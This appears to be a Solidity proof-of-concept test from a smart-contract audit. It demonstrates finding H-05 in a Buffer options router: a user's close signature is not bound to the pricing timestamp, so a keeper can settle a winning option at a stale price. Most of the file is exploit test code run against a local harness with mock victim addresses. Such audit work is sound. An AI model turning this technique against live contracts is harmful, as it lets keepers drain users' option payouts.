// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./BufferHarness.sol";

/// AuditVault #55637 [H-05] — closeAnytime never requires the user's
/// closeAnytime-signature timestamp to match the publisher (pricing) timestamp.
/// `verifyCloseAnytime` binds only (assetPair, userTimestamp, optionId) — NOT the
/// price — so a user's close authorization can be paired with publisher pricing
/// from a completely different time. With private keeper mode disabled, a
/// malicious keeper intercepts a user's close signature and settles it against a
/// stale, unfavorable price, so the user receives far less than they signed for.
contract PoC_55637 is BufferBase {
    address internal constant VICTIM = address(0xA11CE);
    address internal constant OTHER = address(0xBEEF);

    uint256 internal constant STRIKE = 1_000e8;
    uint256 internal constant AMOUNT = 100e6;
    uint256 internal constant FEE = 60e6;

    function test_H05_pricingTimestampDecoupledFromUserSignature() public {
        _deployStack();

        uint256 queuedTime = 1_000;
        uint256 period = 3_600; // expiration = 4600
        vm.warp(50_000);

        // The user signs a close at T_user = 5000, when the price was 1500 (deep ITM):
        // they expect to collect the full payout on their winning option.
        uint256 T_USER = 5_000;

        uint256 optId = _seed(VICTIM, 1, STRIKE, AMOUNT, FEE, queuedTime, period);

        // The user's SINGLE close authorization (bound to T_user, NOT to any price).
        // Both the intended and the intercepted settlement reuse this same user sig.
        // Approve it once; it is valid regardless of which publisher price is paired.
        oneCT.approve(router.closeAnytimeDigest("ETHUSD", T_USER, optId));

        // --- CONTROL: what the user signed for — priced at 1500 @ T_user => FULL 100 ---
        uint256 ctrlId = _seed(OTHER, 2, STRIKE, AMOUNT, FEE, queuedTime, period);
        oneCT.approve(router.closeAnytimeDigest("ETHUSD", T_USER, ctrlId));
        IBufferRouter.CloseAnytimeParams memory intended =
            _closeParams(ctrlId, 1_500e8, true, T_USER, T_USER, T_USER);
        oneCT.approve(router.marketDirectionDigest(intended.closeTradeParams, 2));
        _attestPublisher(intended);
        uint256 otherBefore = usdc.balanceOf(OTHER);
        _close(intended);
        assertEq(usdc.balanceOf(OTHER) - otherBefore, AMOUNT, "correctly-priced close pays the full 100");

        // --- EXPLOIT: keeper reuses the user's T_user close sig, but pairs it with a
        // STALE, unfavorable publisher price (900 @ a DIFFERENT timestamp) ---
        IBufferRouter.CloseAnytimeParams memory intercepted =
            _closeParams(optId, 900e8, true, T_USER, 9_000 /*pubTs != userTs*/, T_USER);
        oneCT.approve(router.marketDirectionDigest(intercepted.closeTradeParams, 1));
        _attestPublisher(intercepted); // publisher genuinely signed 900 @ ts=9000

        uint256 vicBefore = usdc.balanceOf(VICTIM);
        _close(intercepted);
        uint256 vicPayout = usdc.balanceOf(VICTIM) - vicBefore;

        // === HARM: the user's winning option is settled worthless at a mismatched
        // pricing timestamp — they lose the full 100 they signed to collect ===
        assertEq(uint256(_optionState(optId)), uint256(IBufferBinaryOptions.State.Expired), "victim option expired worthless");
        assertEq(vicPayout, 0, "victim receives nothing");
        emit log_named_uint("intended payout (USDC 1e6)", AMOUNT);
        emit log_named_uint("actual payout after price/timestamp mismatch (USDC 1e6)", vicPayout);
        emit log_named_uint("user loss (USDC 1e6)", AMOUNT - vicPayout);
    }
}
